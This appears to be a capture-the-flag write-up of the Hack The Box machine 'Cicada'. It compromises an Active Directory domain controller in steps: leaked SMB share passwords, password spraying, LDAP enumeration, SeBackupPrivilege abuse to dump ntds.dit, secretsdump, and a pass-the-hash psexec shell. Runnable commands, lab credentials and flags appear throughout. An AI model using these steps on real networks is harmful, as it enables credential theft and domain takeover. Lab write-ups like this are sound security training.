## 📄 HTB: [Machine Name: Cicada]

Challenge Details

Category: [[CyberSecurity]], [[Active Directory]], [[Information Leakage]], [[Password Spraying]], [[SeBackupPrivilege Abuse]], [[NTDS Dumping]]

Difficulty: Hard

Target: CICADA-DC (IP: 10.129.231.149)

Status: #solved

Date Completed: [[2025-11-24]]

---

## 🗺️ Phase 1: Reconnaissance and Initial Access

The target is identified as an **Active Directory Domain Controller (DC)** for the **`cicada.htb`** domain. Initial enumeration focused on gathering information from publicly accessible SMB shares.

### A. Initial SMB Share Enumeration

The `netexec` tool confirmed the target's identity and revealed several shares, including **`HR`** with **READ** permissions for the anonymous user (`guest`).

Bash

```
netexec smb $target -u 'guest' -p '' --shares
```

**Key Finding:**

```
SMB          10.129.231.149  445    CICADA-DC      Share           Permissions     Remark
...
SMB          10.129.231.149  445    CICADA-DC      **HR              READ**
...
```

### B. Credential Disclosure

Accessing the **`HR`** share using `smbclient` revealed a critical file containing a default password for new hires.

Bash

```
smbclient //$target/HR -U guest
smb: \> ls
...
Notice from HR.txt           A      1266  Thu Aug 29 03:31:48 2024
...
smb: \> mget *
```

**Content of `Notice from HR.txt`:**

```
Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```

**Default Password Found:** **`Cicada$M6Corpb*@Lp#nZp!8`**

### C. User Enumeration and Password Spray

A list of valid domain users was obtained using a **RID brute-force** attack. This list was then combined with the leaked default password in a **password spray** attack.

1. **User List Generation:**
    
    Bash
    
    ```
    netexec smb $target -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | awk '{print$6}' | cut -d '\' -f2 | tee users
    ```
    
    **Users Found:** `Administrator`, `Guest`, `krbtgt`, `john.smoulder`, `sarah.dantelia`, **`michael.wrightson`**, `david.orelious`, `emily.oscars`
    
2. **Password Spray:**
    
    Bash
    
    ```
    netexec smb $target -u users -p 'Cicada$M6Corpb*@Lp#nZp!8' continue-on-success
    ```
    

**Successful Login:**

```
SMB          10.129.231.149  445    CICADA-DC      [+] cicada.htb\**michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8**
```

**Initial Valid Credential:** **`michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`**

---

## 🎯 Phase 2: Lateral Movement and Privilege Escalation (User Pivot)

Using the newly acquired credentials, further enumeration was performed via LDAP, leading to a higher-privileged user.

### A. LDAP Enumeration

Authenticated LDAP queries were used to dump user details, revealing another cleartext password stored in a user description field.

Bash

```
netexec ldap $target -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

**Key Finding in LDAP Dump:**

```
LDAP 10.129.231.149 389 CICADA-DC david.orelious 2024-03-14 23:17:29 0 Just in case I forget my password is **aRt$Lp#7t*VQ!3**
```

**Second Valid Credential:** **`david.orelious:aRt$Lp#7t*VQ!3`**

### B. Exploiting the DEV Share

The `david.orelious` account was tested on the SMB shares, which now showed read access to the **`DEV`** share.

Bash

```
netexec smb $target -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
...
SMB 10.129.231.149 445 CICADA-DC **DEV READ**
```

Accessing the **`DEV`** share revealed a PowerShell backup script.

Bash

```
smbclient //$target/DEV -U 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
smb: \> ls
...
Backup_script.ps1
```

**Content of `Backup_script.ps1`:**

PowerShell

```
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
...
```

**Third Valid Credential:** **`emily.oscars:Q!3@Lp#M6b*7t*Vt`**

---

## 🚀 Phase 3: Domain User Access and Privilege Escalation

The **`emily.oscars`** account, found in the backup script, was used to gain a shell and check for escalation paths.

### A. Initial Access via WinRM

The credential was used to establish an interactive shell on the DC via WinRM.

Bash

```
evil-winrm -i $target -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

**User Flag Retrieval:**

Bash

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\desktop> type user.txt
**4c5e879794a5ca99851915fbff603e1a**
```

### B. Privilege Check (SeBackupPrivilege)

Checking the user's privileges with `whoami /all` revealed key security permissions:

Bash

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\desktop> whoami /all

GROUP INFORMATION
-----------------
...
BUILTIN\Backup Operators ...

PRIVILEGES INFORMATION
----------------------
Privilege Name                 Description                      State
============================= ============================== =======
**SeBackupPrivilege** Back up files and directories  **Enabled**
**SeRestorePrivilege** Restore files and directories  **Enabled**
...
```

The **`emily.oscars`** user is a member of the **Backup Operators** group, granting the **`SeBackupPrivilege`** and **`SeRestorePrivilege`**. This is a powerful misconfiguration that allows copying almost any file on the system, including the **NTDS.DIT**.

### C. NTDS.DIT Dumping (Privilege Abuse)

The **`SeBackupPrivilege`** was abused to steal the Domain Controller's database (`ntds.dit`) and the corresponding registry hives (`SYSTEM`, `SAM`).

1. **Copy NTDS.DIT:** The `robocopy` utility was used with the `/B` (Backup mode) flag to bypass security checks and copy the database.
    
    PowerShell
    
    ```
    *Evil-WinRM* PS C:\temp> robocopy /b x:\windows\ntds . ntds.dit
    ```
    
2. **Save Registry Hives:** The `reg save` command was used to extract the necessary keys to decrypt the hashes within the database.
    
    PowerShell
    
    ```
    *Evil-WinRM* PS C:\temp> reg save hklm\system c:\windows\temp\system
    *Evil-WinRM* PS C:\temp> reg save hklm\sam c:\windows\temp\sam
    ```
    
3. **Download Files:** The files (`ntds.dit`, `system`, `sam`) were downloaded to the attacker machine. _(Download step is implied.)_
    
4. **Extract Hashes:** The `secretsdump.py` tool was used on the attacker machine to extract all NTLM hashes for domain users.
    
    Bash
    
    ```
    impacket-secretsdump -ntds dtds.dit -system system -sam sam local
    ```
    

**Administrator Hash Found (Snippet):**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:**2b87e7c93a3e8a0ea4a581937016f341**:::
```

**Administrator NTLM Hash:** `:2b87e7c93a3e8a0ea4a581937016f341`

### D. Final Root Access

The Administrator's NTLM hash was used with `psexec` for a pass-the-hash attack to execute code and gain a **System** shell.

Bash

```
lwrap impacket-psexec cicada.htb/Administrator@$target -hashes :2b87e7c93a3e8a0ea4a581937016f341
```

**Final Shell Output Snippet:**

```
C:\Users\Administrator\Desktop>
c886c2ec8fd792c57720384077226f9c
```

**Root Flag:** **`c886c2ec8fd792c57720384077226f9c`**

---

The machine was compromised through: **SMB Share Leak** $\rightarrow$ **Password Spray** $\rightarrow$ **LDAP Info Leak** $\rightarrow$ **SMB Script Leak** $\rightarrow$ **SeBackupPrivilege Abuse** $\rightarrow$ **NTDS.DIT Dump** $\rightarrow$ **Pass-the-Hash** $\rightarrow$ **Root**.
